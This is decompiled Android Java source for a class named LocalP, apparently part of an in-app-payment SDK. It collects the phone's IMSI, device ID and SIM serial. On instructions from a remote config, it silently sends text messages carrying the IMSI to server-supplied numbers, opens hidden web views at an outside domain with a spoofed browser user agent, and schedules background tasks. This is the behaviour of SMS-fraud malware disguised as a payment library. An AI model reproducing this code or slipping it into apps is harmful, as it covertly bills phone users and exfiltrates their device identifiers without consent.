package com.es.iap;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;
import java.util.Timer;

public class LocalP
  implements com.android.b.a.g
{
  int a = 1;
  private com.android.c.a.c b;
  private com.android.a.a.g c;
  private Context d;
  private boolean e = false;
  private Handler f = new d(this);
  private Handler g = new c(this);
  
  public LocalP() {}
  
  private void getConfig()
  {
    Log.d("fmz", "getConfig = 111");
    Log.d("fmz", "getConfig = 222");
    com.android.a.a.c.c(this.d, com.android.a.a.a.g);
    this.b.a(this, this.d);
  }
  
  private String getData()
  {
    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyyMMddhhmmss");
    int i = new Random().nextInt(999999);
    return localSimpleDateFormat.format(new Date()) + i;
  }
  
  private void initTData()
  {
    TelephonyManager localTelephonyManager = (TelephonyManager)this.d.getSystemService("phone");
    com.android.a.a.a.g = localTelephonyManager.getSubscriberId();
    Log.i("fmz", "imsi===" + com.android.a.a.a.g);
    com.android.a.a.a.h = localTelephonyManager.getDeviceId();
    Object localObject = (WifiManager)this.d.getSystemService("wifi");
    if (localObject == null)
    {
      localObject = null;
      if (localObject != null) {
        break label141;
      }
    }
    for (;;)
    {
      com.android.a.a.c.b(this.d, com.android.a.a.a.b);
      com.android.a.a.c.d(this.d, com.android.a.a.a.a);
      com.android.a.a.a.e = com.android.a.a.c.a(this.d);
      com.android.a.a.c.h(this.d, getData());
      com.android.a.a.a.t = com.android.a.a.c.f(this.d);
      com.android.a.a.a.k = localTelephonyManager.getSimSerialNumber();
      return;
      localObject = ((WifiManager)localObject).getConnectionInfo();
      break;
      label141:
      ((WifiInfo)localObject).getMacAddress();
    }
  }
  
  private void readMessage(String paramString)
  {
    sendMessage(paramString);
    new Thread(new a(this)).start();
  }
  
  private void sendMessage(String paramString)
  {
    String str = com.android.a.a.c.b(this.d);
    Log.d("fmz", "pNum = " + paramString + "   imsi = " + str);
    this.b.a("2", "2", this.d);
    Object localObject = new Intent("SMS_SEND_ACTIOIN");
    localObject = PendingIntent.getBroadcast(this.d, 0, (Intent)localObject, 0);
    SmsManager.getDefault().sendTextMessage(paramString, null, str + "A", (PendingIntent)localObject, null);
    com.android.a.a.c.a(this.d, true);
  }
  
  public void onPayStart(Activity paramActivity, boolean paramBoolean)
  {
    Log.d("fmz", "onPayStart = ");
    com.android.a.a.a.o = paramActivity;
    this.d = paramActivity.getBaseContext();
    this.e = paramBoolean;
    com.android.a.a.a.a(this.d);
    this.b = new com.android.c.a.c();
    initTData();
    getConfig();
  }
  
  public void onPc(Context paramContext, boolean paramBoolean)
  {
    this.d = paramContext;
    this.e = paramBoolean;
    com.android.a.a.a.a(this.d);
    this.b = new com.android.c.a.c();
    initTData();
    getConfig();
  }
  
  public void response(Object paramObject, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramObject != null))
    {
      this.c = ((com.android.a.a.g)paramObject);
      if ((!TextUtils.isEmpty(this.c.a)) && (!this.c.a.equals("0"))) {
        com.android.a.a.c.a(this.d, this.c.a);
      }
      com.android.a.a.a.e = this.c.a;
      com.android.a.a.a.f = this.c.b;
      TextUtils.isEmpty(this.c.c);
      if (!com.android.a.a.c.h(this.d))
      {
        com.android.a.a.c.b(this.d, true);
        startAlarm(this.c.d);
      }
    }
  }
  
  public void responseConfig(com.android.a.a.d paramD, boolean paramBoolean)
  {
    if (paramD != null)
    {
      Object localObject;
      if ((this.e) && (!TextUtils.isEmpty(paramD.f())))
      {
        localObject = new Intent("android.intent.action.CALL");
        ((Intent)localObject).putExtra("URL", paramD.f());
        ((Intent)localObject).putExtra("Tsy", paramD.g());
        ((Intent)localObject).putExtra("TanC", paramD.h());
        ((Intent)localObject).setFlags(268435456);
        ((Intent)localObject).setClass(this.d, com.android.read.view.d.class);
        this.d.startActivity((Intent)localObject);
      }
      Log.d("fmz", "fff = " + paramD.e());
      if ((!com.android.a.a.c.g(this.d)) && (!TextUtils.isEmpty(paramD.e()))) {
        readMessage(paramD.e());
      }
      for (;;)
      {
        if (!TextUtils.isEmpty(paramD.d())) {}
        try
        {
          com.android.a.a.a.v = URLDecoder.decode(paramD.d(), "utf-8");
          if ((!TextUtils.isEmpty(paramD.b())) && (!com.android.a.a.c.i(this.d)))
          {
            com.android.a.a.c.c(this.d, true);
            localObject = null;
          }
          try
          {
            String str = URLDecoder.decode(paramD.b(), "utf-8");
            localObject = str;
          }
          catch (UnsupportedEncodingException localUnsupportedEncodingException2)
          {
            for (;;)
            {
              localUnsupportedEncodingException2.printStackTrace();
            }
          }
          com.a.a.b.a = this.d;
          if (!com.a.a.b.b(paramD.a())) {
            new Timer().schedule(new com.a.a.a((String)localObject), Integer.parseInt(paramD.c()) * 1000);
          }
          return;
          this.f.sendEmptyMessage(0);
        }
        catch (UnsupportedEncodingException localUnsupportedEncodingException1)
        {
          for (;;)
          {
            localUnsupportedEncodingException1.printStackTrace();
          }
        }
      }
    }
    if (this.e)
    {
      paramD = new Intent("android.intent.action.CALL");
      paramD.putExtra("URL", "http%3a%2f%2fcweb.idmzone.com%2f");
      paramD.setFlags(268435456);
      paramD.setClass(this.d, com.android.read.view.d.class);
      this.d.startActivity(paramD);
    }
    try
    {
      com.android.a.a.a.v = URLDecoder.decode("Mozilla%2f5.0+(Linux%3b+U%3b+Android+4.0.4%3b+zh-cn%3b+SCH-W2013+Build%2fIMM76D)+AppleWebKit%2f534.30+(KHTML%2c+like+Gecko)+Version%2f4.0+Mobile+Safari%2f534.30", "utf-8");
      this.f.sendEmptyMessage(0);
      return;
    }
    catch (UnsupportedEncodingException paramD)
    {
      for (;;)
      {
        paramD.printStackTrace();
      }
    }
  }
  
  public void startAlarm(String paramString)
  {
    if (!TextUtils.isEmpty(paramString)) {
      this.a = Integer.parseInt(paramString);
    }
    new Thread(new b(this)).start();
  }
}
